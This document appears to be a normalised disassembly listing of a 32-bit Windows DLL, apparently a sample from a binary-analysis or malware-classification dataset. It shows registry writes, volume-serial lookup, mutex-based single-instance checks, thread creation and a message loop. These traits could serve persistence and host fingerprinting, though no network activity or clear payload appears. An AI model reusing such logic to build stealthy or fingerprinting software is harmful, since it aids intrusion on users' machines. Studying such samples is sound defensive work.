add esp 0x4
lea ecx [ ebp + 0x8 ]
call sub_100018c0
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
jmp r-xdata
xor esi esi
mov ecx [ ebp - 0x2c ]
mov [ eax ] edi
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call sub_100018c0
mov eax esi
sub_100185b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dd48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x2c ] esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_100019e0
mov ecx esi
call sub_10017ec0
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
mov edx [ ebp + 0x28 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_1001b1b4
add esp 0x10
push 0x4
lea ecx [ ebp + 0x8 ]
push ecx
push 0x4
push 0x0
lea edx [ ebp - 0x28 ]
push edx
push esi
call [ RegSetValueExW@IAT ]
push esi
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x24
mov al 0x1
mov ecx [ ebp + 0xc ]
push ecx
call sub_10019ce4
add esp 0x4
sub_100186c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dd78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x2c ] esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_100019e0
mov ecx esi
call sub_10017ec0
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp + 0x28 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_1001b1b4
mov eax [ edi + 0x4 ]
mov edi [ edi ]
add esp 0x10
push eax
push edi
push 0x3
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call [ RegSetValueExW@IAT ]
push esi
test eax eax
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
mov al 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ ebp + 0xc ]
push edx
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x24
sub_100187f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002de2e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ ebp + 0xc ]
mov [ edi + 0x4 ] r--data
mov [ ebp - 0xc8 ] eax
xor ebx ebx
mov [ edi ] r--data
mov [ edi + 0x4 ] r--data
mov eax 0x7
xor edx edx
mov [ edi + 0x1c ] eax
mov [ edi + 0x18 ] ebx
mov [ ebp - 0xd0 ] edi
mov [ ebp - 0xc0 ] ecx
mov [ ebp - 0xcc ] ebx
mov [ edi + 0x8 ] dx
xor ecx ecx
mov [ edi + 0x38 ] eax
mov [ edi + 0x34 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x24 ] cx
mov [ edi + 0x5c ] eax
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] dx
push 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1001a818
add esp 0x4
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
mov esi [ ebp - 0xc8 ]
cmp esi ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10012790
push 0x24
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0xb8 ]
push eax
mov ecx esi
call sub_10012c50
push 0x20
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_10012770
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx esi
call sub_10012c50
mov [ ebp - 0x4 ] 0x5
cmp esi ebx
je r-xdata
mov al [ ebp - 0xcc ]
xor edx edx
mov eax esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ ebp - 0xb9 ] bl
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
cmp [ ebp - 0x1c ] 0x2
mov eax 0x1
jb r-xdata
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
call sub_100034e0
xor ecx ecx
mov eax esi
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
push 0xffffffff
push ebx
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ edi + 0x8 ]
call sub_100019e0
push 0xffffffff
push ebx
lea edx [ ebp - 0x9c ]
push edx
lea ecx [ edi + 0x24 ]
call sub_100019e0
mov esi 0x8
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov [ ebp - 0xb9 ] 0x1
mov [ ebp - 0xb9 ] bl
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
lea edx [ ebp - 0x48 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x64 ]
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10013a70
lea edx [ ebp - 0xb8 ]
push edx
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_10007de0
add esp 0x18
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x9
call sub_10003860
cmp [ ebp - 0x6c ] 0x8
jb r-xdata
lea eax [ edi + 0x48 ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
mov [ eax + 0x10 ] ebx
cmp [ eax + 0x14 ] esi
jb r-xdata
test al 0x1
je r-xdata
xor edx edx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ eax ] cx
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ eax + 0x8 ] edx
sub esp 0x1c
mov [ eax + 0xc ] ecx
mov eax [ ebp - 0xc0 ]
mov ecx esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ebp - 0xc4 ] esp
mov [ ecx ] dx
lea esi [ eax + 0x2 ]
mov edi edi
mov eax [ eax ]
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
mov eax [ ebp - 0xc0 ]
push eax
call sub_100034e0
mov ecx edi
call sub_10018010
mov esi 0x8
cmp [ ebp - 0x88 ] esi
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] 0x5
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10019ce4
add esp 0x4
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
call sub_100034e0
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp - 0xb8 ]
push eax
call sub_10019ce4
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_10013a70
lea ecx [ ebp - 0x9c ]
push ecx
push eax
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4 ] 0xc
call sub_10007de0
add esp 0x18
push eax
lea ecx [ edi + 0x24 ]
mov [ ebp - 0x4 ] 0xd
call sub_10003860
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] ax
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
sub_10018cb0
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call sub_1001a9b0
add esp 0xc
push 0x0
push 0x0
lea edx [ ebp - 0x214 ]
push edx
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
push 0x208
lea edx [ ebp - 0x20c ]
push edx
push 0x0
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
sub_10018d40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
push 0x1
push 0x0
mov esi ecx
call [ CreateMutexW@IAT ]
mov [ esi + 0x4 ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
setne al
pop esi
pop ebp
retn 0x4
sub_10018d80
push ebp
mov ebp esp
push 0xffffffff
push sub_1002de97
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8c ]
call sub_10005dc0
xor ebx ebx
push 0x84
mov [ ebp - 0x4 ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
mov ecx eax
call sub_10012660
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx eax
call sub_10007f90
mov [ ebp - 0x14 ] eax
jmp r-xdata
push 0x48
mov [ ebp - 0x4 ] bl
call sub_1001a818
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_1000de30
mov edi eax
jmp r-xdata
push 0x68
mov [ ebp - 0x4 ] bl
call sub_1001a818
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_1000f970
mov esi eax
jmp r-xdata
push 0x48
mov [ ebp - 0x4 ] bl
call sub_1001a818
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] bl
call sub_100062b0
mov edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x8c ]
call sub_100038e0
push edi
lea ecx [ ebp - 0x8c ]
call sub_100038e0
push esi
lea ecx [ ebp - 0x8c ]
call sub_100038e0
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x5
call sub_10003e20
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100060b0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10018ed8
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100060b0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
init
push ebp
mov ebp esp
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push 0x18
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
xor esi esi
push 0xc
push rw-data
push 0x50
push rw-data
mov ecx eax
call sub_10012710
mov esi eax
jmp r-xdata
push eax
push 0x1
push 0x0
call [ OpenMutexW@IAT ]
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0xc ] ebx
jb r-xdata
mov eax [ eax ]
lea eax [ ebp - 0x20 ]
push eax
mov ecx esi
call sub_10012c50
mov ebx 0x8
cmp [ eax + 0x14 ] ebx
jb r-xdata
xor edx edx
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x20 ] dx
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
call sub_10019ce4
add esp 0x4
test esi esi
je r-xdata
pop esi
xor al al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push edi
push 0x2
push 0x400
call sub_1001a8ef
mov edi eax
push 0x18
mov [ ebp - 0x44 ] edi
call sub_1001a818
add esp 0xc
test eax eax
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
xor esi esi
push 0xc
push rw-data
push 0x20
push rw-data
mov ecx eax
call sub_10012710
mov esi eax
jmp r-xdata
push 0x400
push edi
push eax
call [ GetEnvironmentVariableW@IAT ]
cmp [ ebp - 0x28 ] ebx
jb r-xdata
mov eax [ eax ]
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] ebx
jb r-xdata
test esi esi
je r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_10019ce4
add esp 0x4
lea edx [ ebp - 0x48 ]
push edx
push 0x0
push edi
push sub_10018d80
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov esi [ GetMessageW@IAT ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x64 ]
push eax
call esi
test eax eax
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x40 ]
push ecx
call [ CloseHandle@IAT ]
push edi
call sub_1001a3eb
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_1001a809
mov esp ebp
pop ebp
retn
mov edi [ TranslateMessage@IAT ]
mov ebx [ DispatchMessageW@IAT ]
lea ecx [ ecx ]
lea ecx [ ebp - 0x64 ]
push ecx
call edi
lea edx [ ebp - 0x64 ]
push edx
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x64 ]
push eax
call esi
test eax eax
jne r-xdata
mov edi [ ebp - 0x44 ]
sub_100190f4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10019ba5
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1001a898
int3
sub_10019141
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10019ba5
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1001a898
int3
sub_1001918e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019c01
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_100191ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1001bc96
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1001bc70
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_1001b723
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_1001b79d
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_1001b6dd
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_100192c7
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001bc96
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1001bc70
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_1001bd01
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_1001b723
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_1001b723
push eax
push [ esi + 0x8 ]
call sub_10019cf0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1001933d
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_10019a80
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_1001936e
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_10019a90
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10019397
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_10019aa0
pop ecx
sub_100193eb
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_1001a818
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_10019415
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10009280
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10019436
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10019397
push rw-data
call sub_10019415
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_100193bf
leave
retn
sub_10019468
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_10019436
mov [ rw-data ] 0x1
call sub_10019ac0
pop ecx
sub_10019492
push 0x4
mov eax sub_1002deeb
call sub_1001be26
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10019397
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_1001a3eb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_100193bf
call sub_1001be8f
retn
mov ecx [ eax ]
call sub_10009280
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_100194f2
push 0x4
mov eax sub_1002deeb
call sub_1001be26
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10019397
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_100193d6
push esi
call sub_10019ce4
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100193bf
call sub_1001be8f
retn
sub_10019540
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_1001ca32
pop ecx
pop ecx
sub_1001955b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_1001a3eb
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_1001aa2a
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_10019cf0
add esp 0xc
sub_100195b3
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_1001ca32
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_1001955b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_1001ca32
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_1001955b
pop esi
pop ebp
retn
sub_10019600
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_1001955b
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001963f
push 0x4
mov eax sub_1002dec8
call sub_1001be26
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10019492
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_1001be8f
retn
push eax
call sub_1001a3eb
pop ecx
sub_10019682
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001963f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_100196a3
push 0x4
mov eax sub_1002deeb
call sub_1001be26
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_1001be8f
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_10019397
